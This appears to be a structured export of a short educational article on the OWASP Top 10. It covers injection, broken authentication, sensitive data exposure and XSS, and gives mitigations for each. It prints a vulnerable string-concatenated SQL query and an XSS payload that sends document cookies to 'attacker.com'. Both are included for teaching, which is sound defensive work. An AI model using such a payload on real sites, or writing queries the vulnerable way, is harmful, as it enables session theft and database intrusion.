content: [{"order":1,"type":"heading","text":"OWASP Top 10 Vulnerabilities and Mitigation"},{"order":2,"type":"paragraph","text":"The OWASP Top 10 is a standard awareness document that represents the most critical security risks to web applications. Understanding these vulnerabilities and their mitigations is essential for any software engineer or cybersecurity professional."},{"order":3,"type":"subheading","text":"1. Injection (SQL, NoSQL, OS Command)"},{"order":4,"type":"paragraph","text":"Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization."},{"order":5,"type":"code","text":"String query = \"SELECT * FROM accounts WHERE user = '\" + userInput + \"';\"; // Vulnerable"},{"order":6,"type":"bullet_point","text":"Mitigation: Use safe APIs, such as parameterized queries and Prepared Statements, which separate data from code."},{"order":7,"type":"code","text":"String query = \"SELECT * FROM accounts WHERE user = ?;\"; PreparedStatement pstmt = conn.prepareStatement(query); pstmt.setString(1, userInput); // Secure"},{"order":8,"type":"subheading","text":"2. Broken Authentication"},{"order":9,"type":"paragraph","text":"Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens."},{"order":10,"type":"bullet_point","text":"Mitigation: Implement multi-factor authentication (MFA) to prevent automated credential stuffing and brute-force attacks."},{"order":11,"type":"bullet_point","text":"Mitigation: Enforce strong password complexity rules and check against lists of compromised passwords."},{"order":12,"type":"subheading","text":"3. Sensitive Data Exposure"},{"order":13,"type":"paragraph","text":"Web applications and APIs frequently fail to protect sensitive data, such as financial records, healthcare data, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes."},{"order":14,"type":"bullet_point","text":"Mitigation: Encrypt all sensitive data at rest using robust algorithms like AES-256."},{"order":15,"type":"bullet_point","text":"Mitigation: Enforce HTTPS for all transit data using modern TLS protocols and secure cipher suites."},{"order":16,"type":"subheading","text":"4. Cross-Site Scripting (XSS)"},{"order":17,"type":"paragraph","text":"XSS flaws occur whenever an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute scripts in the victim's browser."},{"order":18,"type":"code","text":"<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>"},{"order":19,"type":"bullet_point","text":"Mitigation: Context-aware output encoding to neutralize malicious payloads before rendering them in the DOM."},{"order":20,"type":"bullet_point","text":"Mitigation: Implement a strong Content Security Policy (CSP) to restrict unauthorized script execution."},{"order":21,"type":"subheading","text":"Conclusion"},{"order":22,"type":"paragraph","text":"Securing web applications requires a defense-in-depth approach. By integrating security checks into the CI/CD pipeline and adhering to secure coding principles, organizations can drastically reduce their attack surface and mitigate OWASP Top 10 vulnerabilities."}]
